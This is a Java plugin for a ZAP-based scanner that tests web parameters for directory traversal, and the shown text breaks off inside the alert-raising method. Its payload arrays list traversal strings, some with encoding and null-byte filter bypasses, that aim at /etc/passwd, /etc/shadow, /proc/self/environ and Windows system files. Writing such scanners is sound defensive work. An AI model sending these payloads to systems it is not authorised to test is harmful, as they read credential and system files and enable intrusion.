package com.saas_security.security_modules;

import org.parosproxy.paros.core.scanner.*;
import org.parosproxy.paros.network.*;
import org.zaproxy.zap.model.*;

/**
 * Advanced Directory Traversal Scanner adapted from ZAP's directory traversal testing capabilities
 */
public class DirectoryTraversalScanner extends AbstractAppParamPlugin {
    
    private static final int DIRECTORY_TRAVERSAL_PLUGIN_ID = 6; // ZAP's Directory/Path traversal ID
    
    // Directory traversal payloads
    private static final String[] BASIC_TRAVERSAL_PAYLOADS = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\boot.ini",
        "..\\..\\..\\windows\\win.ini",
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../../etc/motd",
        "../../../var/log/messages",
        "../../../var/log/auth.log",
        "../../../proc/version",
        "../../../proc/cpuinfo"
    };
    
    private static final String[] ENCODED_TRAVERSAL_PAYLOADS = {
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
        "..%2f..%5c..%2f..%5c..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "....\\..\\....\\..\\....\\..\\windows\\system32\\drivers\\etc\\hosts"
    };
    
    private static final String[] BYPASS_TRAVERSAL_PAYLOADS = {
        "..%2f..%2f..%2fetc%2fpasswd%00",
        "..%2f..%2f..%2fetc%2fpasswd%00.txt",
        "..%2f..%2f..%2fetc%2fpasswd%00.jpg",
        "etc/passwd",
        "/etc/passwd",
        "\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "file:///etc/passwd",
        "file:///C:\\windows\\system32\\drivers\\etc\\hosts"
    };
    
    private static final String[] DOUBLE_ENCODED_PAYLOADS = {
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "%252552e%252552e%252552f%252552e%252552e%252552f%252552e%252552e%252552fetc%252552fpasswd",
        "..%2525252f..%2525252f..%2525252fetc%2525252fpasswd"
    };
    
    private static final String[] NULL_BYTE_PAYLOADS = {
        "../../../etc/passwd%00",
        "../../../etc/passwd%2500",
        "../../../etc/passwd%00.txt",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.php",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%2500"
    };
    
    @Override
    public int getId() {
        return DIRECTORY_TRAVERSAL_PLUGIN_ID;
    }
    
    @Override
    public String getName() {
        return "Directory Traversal";
    }
    
    @Override
    public String getDescription() {
        return "Advanced directory traversal vulnerability scanner with multiple bypass techniques";
    }
    
    @Override
    public int getCategory() {
        return Category.INJECTION;
    }
    
    @Override
    public String getSolution() {
        return "Ensure application validates and sanitizes file paths. Use whitelist approach for file access.";
    }
    
    @Override
    public String getReference() {
        return "https://owasp.org/www-community/attacks/Path_Traversal\nhttps://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html";
    }
    
    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }
    
    @Override
    public int getCweId() {
        return 22; // CWE-22: Path Traversal
    }
    
    @Override
    public int getWascId() {
        return 33; // WASC-33: Path Traversal
    }
    
    @Override
    public void init() {
        // Plugin initialization
    }
    
    @Override
    public void scan() {
        // Test basic directory traversal
        if (testBasicTraversal()) {
            return;
        }
        
        // Test encoded directory traversal
        if (testEncodedTraversal()) {
            return;
        }
        
        // Test bypass techniques
        if (testBypassTraversal()) {
            return;
        }
        
        // Test double encoded traversal
        if (testDoubleEncodedTraversal()) {
            return;
        }
        
        // Test null byte exploitation
        if (testNullByteTraversal()) {
            return;
        }
    }
    
    private boolean testBasicTraversal() {
        for (String payload : BASIC_TRAVERSAL_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), payload, msg.getParamSet());
            sendAndReceive(msg);
            
            if (checkForTraversalVulnerability(msg, payload)) {
                return true;
            }
        }
        return false;
    }
    
    private boolean testEncodedTraversal() {
        for (String payload : ENCODED_TRAVERSAL_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), payload, msg.getParamSet());
            sendAndReceive(msg);
            
            if (checkForTraversalVulnerability(msg, payload)) {
                return true;
            }
        }
        return false;
    }
    
    private boolean testBypassTraversal() {
        for (String payload : BYPASS_TRAVERSAL_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), payload, msg.getParamSet());
            sendAndReceive(msg);
            
            if (checkForTraversalVulnerability(msg, payload)) {
                return true;
            }
        }
        return false;
    }
    
    private boolean testDoubleEncodedTraversal() {
        for (String payload : DOUBLE_ENCODED_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), payload, msg.getParamSet());
            sendAndReceive(msg);
            
            if (checkForTraversalVulnerability(msg, payload)) {
                return true;
            }
 }
        return false;
    }
    
    private boolean testNullByteTraversal() {
        for (String payload : NULL_BYTE_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), payload, msg.getParamSet());
            sendAndReceive(msg);
            
            if (checkForTraversalVulnerability(msg, payload)) {
                return true;
            }
        }
        return false;
    }
    
    private boolean checkForTraversalVulnerability(HttpMessage msg, String payload) {
        String responseBody = msg.getResponseBody().toString();
        String responseStatus = String.valueOf(msg.getResponseHeader().getStatusCode());
        
        // Check for file system indicators
        String[] linuxIndicators = {
            "root:x:0:0:",
            "daemon:x:1:1:",
            "bin:x:2:2:",
            "sys:x:3:3:",
            "sync:x:4:65534:",
            "/bin/bash",
            "/sbin/nologin",
            "localhost.localdomain",
            "127.0.0.1",
            "localhost"
        };
        
        String[] windowsIndicators = {
            "[boot loader]",
            "default=",
            "multi(0)disk(0)",
            "Microsoft Windows",
            "Windows IP Configuration",
            "Copyright (c) Microsoft Corp",
            "# localhost name resolution",
            "127.0.0.1 localhost"
        };
        
        String responseLower = responseBody.toLowerCase();
        
        // Check for Linux file system contents
        int linuxMatches = 0;
        for (String indicator : linuxIndicators) {
            if (responseBody.contains(indicator)) {
                linuxMatches++;
            }
        }
        
        // Check for Windows file system contents  
        int windowsmatches = 0;
        for (String indicator : windowsIndicators) {
            if (responseBody.contains(indicator)) {
                windowsmatches++;
            }
        }
        
        // Determine vulnerability based on matches
        boolean isVulnerable = false;
        String vulnerabilityType = "";
        
        if (linuxMatches >= 3) {
            isVulnerable = true;
            vulnerabilityType = "Linux Directory Traversal";
        } else if (windowsmatches >= 3) {
            isVulnerable = true;
            vulnerabilityType = "Windows Directory Traversal";
        }
        
        // Additional checks for common file content patterns
        if (!isVulnerable) {
            if (responseBody.contains("root:") && responseBody.contains("bin:") && 
                responseBody.contains("sys:") && payload.contains("passwd")) {
                isVulnerable = true;
                vulnerabilityType = "Linux /etc/passwd Exposure";
            } else if (responseBody.contains("[boot loader]") && payload.contains("boot.ini")) {
                isVulnerable = true;
                vulnerabilityType = "Windows boot.ini Exposure";
            } else if (responseBody.contains("127.0.0.1") && responseBody.contains("localhost") && 
                      payload.contains("hosts")) {
                isVulnerable = true;
                vulnerabilityType = "System hosts File Exposure";
            }
        }
        
        if (isVulnerable) {
            raiseTraversalAlert(payload, responseBody, vulnerabilityType);
            return true;
        }
        
        return false;
    }
    
    private void raiseTraversalAlert(String payload, String responseBody, String vulnerabilityType) {
        Alert alert = new Alert(getRisk(), Alert.CONFIDENCE_HIGH, getName());
        alert.setDetail(getDescription() + " - " + vulnerabilityType,
                       getBaseMsg().getRequestHeader().getURI().toString(),
                       getParameterName(getBaseMsg()),
                       payload,
                       "", "", responseBody, "", "", "", "", "", "", "", "");
        alert.setCweId(getCweId());
